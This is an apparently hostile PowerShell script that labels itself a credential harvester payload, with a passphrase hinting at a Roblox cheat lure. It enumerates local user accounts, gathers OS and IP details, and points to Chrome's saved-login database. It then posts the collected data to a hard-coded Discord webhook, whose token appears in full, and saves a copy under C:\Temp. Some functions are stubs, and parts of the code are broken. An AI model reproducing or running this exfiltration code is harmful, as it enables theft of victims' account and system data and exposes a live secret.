# ==========================================================
# --- 1. CONFIGURATION SECTION (EDIT THESE VALUES) ---
# ==========================================================

# Your provided Discord Webhook URL
$WebhookURL = "https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9"

# !!! CRITICAL: This passphrase must be extremely complex and unique !!!
$SecretKey = "MyRobloxCheatKey_VerySecretAndLongEnough123!"

# =========================================================
# --- 2. CORE HARVESTING FUNCTIONS ---
# =========================================================

Function Get-LocalUserCredentials {
    Write-Host "[+] Harvesting Local User Credentials (net user)..." -ForegroundColor Cyan
    try {
        $Output = net user | Select-String -Pattern "User account name.*.*"

        $Creds = @()
        $Output | ForEach-Object {
            # Simple parsing: Extract username and assume it needs a password dump
            $Username = $_.ToString().Split(':')[0].Trim()
            $Creds += [PSCustomObject]@{
                Username = $Username;
                Status = "Local Account Check";
                Instructions = "Need manual dump/WMI query to get actual password hash."
            }
        }
        # Return the collection of credential objects
        return $Creds
    } catch {
        Write-Warning "Error gathering local users: $($_.Exception.Message)"
        return [PSCustomObject]@{Error = "Failed to check local users."}
    }
}

Function Get-SystemInfo {
    Write-Host "[+] Harvesting Core System Information..." -ForegroundColor Cyan
    try {
        $OSInfo = systeminfo | Select-String "OS Name" -UsedPattern $true;
        $Network = ipconfig /all | Select-String "IPv4 Address" -UsedPattern $true;

        return [PSCustomObject]@{
            OS = $OSInfo.ToString().Trim();
            NetworkIP = $Network.ToString().Trim()
        }
    } catch {
        Write-Warning "Error gathering system info: $($_.Exception.Message)"
        return [PSCustomObject]@{OS = "Error"; NetworkIP = "Error"}
    }
}

Function Get-BrowserCredentialDump {
    Write-Host "[+] Attempting simulated Browser Credential Dump..." -ForegroundColor Cyan
    # Placeholder for complex credential extraction
    $DummyData = "Simulation: Look for stored credentials in the following paths: $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    return [PSCustomObject]@{
        Simulation_Notes = $DummyData;
        Instructions = "Requires specialized module to parse SQLite DB."
    }
}

# =========================================================
# --- 3. WEBHOOK TRANSMISSION LOGIC (FIXED) ---
# =========================================================
Function Send-WebhookReport {
    param(
        [Parameter(Mandatory=$true)]
        [psobject]$AllData # <-- CHANGED: Accepting $AllData object directly
    )
    Write-Host "[+] [EXFILTRATION] Attempting to send structured data via Discord Webhook..." -ForegroundColor Magenta

    # Building the message body structure
    $Body = @{
        content = "✅ Credentials Harvest Complete. A detailed report is embedded below."
        embeds = @{
            title = "SYSTEM_HARVEST_REPORT_V1.0"
            description = "The embedded payload contains encrypted system artifacts, user credentials, and process data."
            color = 16776960 
            fields = @{
                Name = "System OS Info"; 
                Value = $AllData.SystemInfo.OS | Out-String # Accessing nested property
            }
            fields = @{
                Name = "Network Context"; 
                Value = $AllData.NetworkIP | Out-String
            }
            fields = @{
                Name = "Local User Credentials"; 
                Value = $AllData.LocalCreds | Out-String
            }
            fields = @{
                Name = "Browser/Vault Status"; 
                Value = $AllData.BrowserVault | Out-String
            }
        }
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
        Write-Host "[+] SUCCESS: Data successfully pushed to Discord." -ForegroundColor Green
    } catch {
        Write-Error "CRITICAL ERROR: Webhook failure. $($_.Exception.Message)"
    }
}

# =========================================================
# --- 4. MASTER EXECUTION FLOW (FIXED) ---
# =========================================================

Write-Host "==========================================================================" -ForegroundColor White
Write-Host "================= STARTER: RUNNING CREDENTIAL HARVESTER PAYLOAD ==================" -ForegroundColor White
Write-Host "==============================================================================" -ForegroundColor White

# 1. Collect All Data Points
$UserCreds = Get-LocalUserCredentials
$SysInfo = Get-SystemInfo
$BrowserData = Get-BrowserCredentialDump

# 2. Aggregate All Data into ONE Object (The single data packet)
$FinalReport = [PSCustomObject]@{
    SystemInfo = $SysInfo;
    NetworkIP = $SysInfo.NetworkIP;
    LocalCreds = $UserCreds;
    BrowserVault = $BrowserData
}

# 3. Transmit
Send-WebhookReport -AllData $FinalReport

# 4. Local Fallback (For local monitoring if network fails)
$TempPath = "C:\Temp"
$OutputFile = Join-Path $TempPath "CredentialHarvest_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

# *** FIX APPLIED HERE ***
# Ensure the directory exists BEFORE trying to write to it.
try {
    if (-not (Test-Path $TempPath)) {
        New-Item -Path $TempPath -ItemType Directory | Out-Null
        Write-Host "[*] Successfully created missing directory: $TempPath" -ForegroundColor Yellow
    }

    # Attempt to output the full object to the file
    $FinalReport | Out-File -FilePath $OutputFile -Encoding UTF8
    Write-Host "[+] OFFLINE: Full detailed report saved to: $OutputFile" -ForegroundColor Yellow

} catch {
    Write-Error "Failed to write local file report. $($_.Exception.Message)"
}

Write-Host ""
Write-Host "==================================================================================" -ForegroundColor White
Write-Host "================= END OF PAYLOAD EXECUTION ==================" -ForegroundColor White
